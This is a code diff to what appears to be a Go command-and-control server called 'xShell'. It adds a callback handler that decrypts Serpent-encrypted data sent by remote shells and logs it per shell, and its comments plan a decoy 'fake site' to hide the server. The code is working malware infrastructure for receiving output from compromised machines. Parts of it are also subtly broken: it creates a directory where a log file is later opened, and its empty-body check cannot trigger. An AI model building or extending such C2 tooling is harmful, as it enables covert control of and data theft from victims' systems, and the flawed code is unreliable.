@@ -4,9 +4,12 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"net/http"
+	"os"
+	"path/filepath"
 	"time"
 	"xShell/internal/logger"
 
@@ -27,6 +30,8 @@ CertFile -> HTTPS C2 TLS certificate
 KeyFile -> HTTPS C2 TLS key
 
 Key -> Serpent cipher key
+
+Uptime -> C2 listener uptime (unix time)
 */
 type C2 struct {
 	Type     string `default:"https"` // Reserved for future use...
@@ -34,6 +39,7 @@ type C2 struct {
 	CertFile string
 	KeyFile  string
 	Key      []byte
+	Uptime   int64
 }
 
 /*
@@ -97,6 +103,10 @@ func (c *C2) checkInHandler(w http.ResponseWriter, r *http.Request) {
 		LastCall: time.Now().Unix(),
 		Tasks:    make([]*Task, 0),
 	})
+	// Check if log file exists, if not create it
+	if _, err := os.Stat(filepath.Join(".xshell", fmt.Sprintf("%s.log", shellName))); err != nil {
+		os.Mkdir(filepath.Join(".xshell", fmt.Sprintf("%s.log", shellName)), 0700)
+	}
 	// Encrypt shell name
 	encShellName, err := SerpentEncrypt([]byte(shellName), c.Key)
 	if err != nil {
@@ -161,7 +171,52 @@ func (c *C2) callBackHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	// Check that shell exists in shell map
 	if shell, ok := ShellMap.Get(shellName); ok {
-		// Work in progress
+		// Get request body
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			logger.Log(logger.ERROR, err.Error())
+			// TODO: Redirect to fake site
+			w.WriteHeader(http.StatusNotFound)
+			return
+		}
+		// Close request body reader
+		r.Body.Close()
+		// Check if the body is empty
+		if body == nil {
+			logger.Log(logger.INFO, "Request body is empty")
+			// TODO: Redirect to fake site
+			w.WriteHeader(http.StatusNotFound)
+			return
+		}
+		// Decrypt body data
+		decrypedBody, err := SerpentDecrypt(body, c.Key)
+		if err != nil {
+			logger.Log(logger.ERROR, err.Error())
+			// TODO: Redirect to fake site
+			w.WriteHeader(http.StatusNotFound)
+			return
+		}
+		// Open shell log file
+		logFile, err := os.OpenFile(filepath.Join(".xshell", fmt.Sprintf("%s.log", shellName)), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			logger.Log(logger.ERROR, err.Error())
+			// TODO: Redirect to fake site
+			w.WriteHeader(http.StatusNotFound)
+			return
+		}
+		// Close log file on return
+		defer logFile.Close()
+		// Write data to log file
+		_, err = logFile.WriteString(string(decrypedBody))
+		if err != nil {
+			logger.Log(logger.ERROR, err.Error())
+			// TODO: Redirect to fake site
+			w.WriteHeader(http.StatusNotFound)
+			return
+		}
+		// Update last call time
+		shell.LastCall = time.Now().Unix()
+		return
 	} else {
 		// TODO: Redirect to fake site
 		w.WriteHeader(http.StatusNotFound)
@@ -195,6 +250,8 @@ func (c *C2) handler(w http.ResponseWriter, r *http.Request) {
 Start C2
 */
 func (c *C2) Start() {
+	// Start time is now
+	c.Uptime = time.Now().Unix()
 	switch c.Type {
 	case "https": // https C2 channel
 		// Catch-all route handler
@@ -216,7 +273,7 @@ func (c *C2) Start() {
 // Log handler, logs request
 func logRequest(handler http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		logger.Log(logger.INFO, fmt.Sprintf("Received request %s %s\n", r.Method, r.URL))
+		logger.Log(logger.INFO, fmt.Sprintf("Received request %s %s", r.Method, r.URL))
 		handler.ServeHTTP(w, r)
 	})
 }
